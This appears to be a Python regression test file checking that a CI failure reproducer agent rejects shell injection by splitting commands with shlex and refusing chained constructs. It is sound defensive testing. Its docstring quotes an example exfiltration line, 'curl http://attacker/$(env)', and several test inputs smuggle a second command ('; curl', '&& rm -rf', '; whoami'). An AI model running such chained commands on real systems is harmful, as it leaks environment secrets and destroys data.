"""Regression tests for ci_failure_reproducer shell-injection hardening.

The agent previously ran `subprocess.run(cmd, shell=True, ...)` against a
caller-supplied (or log-extracted) command string with only a denylist regex
as a guard. A caller could submit `pytest; curl http://attacker/$(env)` and
chain commands. These tests pin the post-fix behaviour:

  - Commands are split via shlex (shell=False) and executed as argv.
  - Compound shell constructs (`;`, `&&`, `||`, `|`, redirections) are
    rejected with a structured ``shell_compound_unsupported`` envelope; no
    second command runs.
  - Shell builtins (`cd`, `source`, …) are rejected with
    ``shell_builtin_unsupported``.
  - Unparseable quoting raises ``command_unparseable``.
  - The denylist regex still rejects rm -rf / etc. (defence-in-depth).
"""

from __future__ import annotations

import tempfile

from agents import ci_failure_reproducer as cfr


def test_compound_semicolon_is_rejected():
    """`pytest; curl evil` must not chain — the second command must never run."""
    parsed = cfr._split_command("pytest tests/ ; curl http://example.invalid")
    assert isinstance(parsed, dict), "compound shell command should be rejected as a dict"
    assert parsed["error"]["code"] == "ci_failure_reproducer.shell_compound_unsupported"


def test_compound_double_amp_is_rejected():
    parsed = cfr._split_command("pytest && rm -rf /tmp/foo")
    assert isinstance(parsed, dict)
    assert parsed["error"]["code"] == "ci_failure_reproducer.shell_compound_unsupported"


def test_pipe_is_rejected():
    parsed = cfr._split_command("pytest | grep FAIL")
    assert isinstance(parsed, dict)
    assert parsed["error"]["code"] == "ci_failure_reproducer.shell_compound_unsupported"


def test_redirection_is_rejected():
    parsed = cfr._split_command("pytest > /tmp/out.log")
    assert isinstance(parsed, dict)
    assert parsed["error"]["code"] == "ci_failure_reproducer.shell_compound_unsupported"


def test_shell_builtin_is_rejected():
    parsed = cfr._split_command("cd /tmp")
    assert isinstance(parsed, dict)
    assert parsed["error"]["code"] == "ci_failure_reproducer.shell_builtin_unsupported"


def test_normal_command_is_argv_split():
    """A plain pytest invocation must split cleanly to argv."""
    argv = cfr._split_command("pytest -q tests/test_foo.py::test_bar")
    assert argv == ["pytest", "-q", "tests/test_foo.py::test_bar"]


def test_quoted_argument_is_preserved():
    """Quoted args must round-trip through shlex without losing the quoted span."""
    argv = cfr._split_command('pytest -k "test foo and bar"')
    assert argv == ["pytest", "-k", "test foo and bar"]


def test_unbalanced_quote_is_rejected():
    parsed = cfr._split_command('pytest -k "unterminated')
    assert isinstance(parsed, dict)
    assert parsed["error"]["code"] == "ci_failure_reproducer.command_unparseable"


def test_run_command_rejected_path_returns_synthetic_result():
    """_run_command must surface the rejection without raising."""
    with tempfile.TemporaryDirectory() as tmp:
        result = cfr._run_command("pytest; whoami", tmp, timeout=5)
    assert result["rejected"] is True
    assert result["exit_code"] == 2
    assert result["timed_out"] is False
    # No actual subprocess ran, so duration is logged as 0ms.
    assert result["duration_ms"] == 0
    assert "shell_compound_unsupported" in result["rejection"]["code"]


def test_run_command_missing_binary_returns_127():
    """A genuinely missing executable should return exit 127, not chain a fallback."""
    with tempfile.TemporaryDirectory() as tmp:
        result = cfr._run_command("definitely-not-a-real-binary-xyz", tmp, timeout=5)
    assert result["exit_code"] == 127
    assert "Executable not found" in result["stderr"]
    assert result.get("rejected") is None
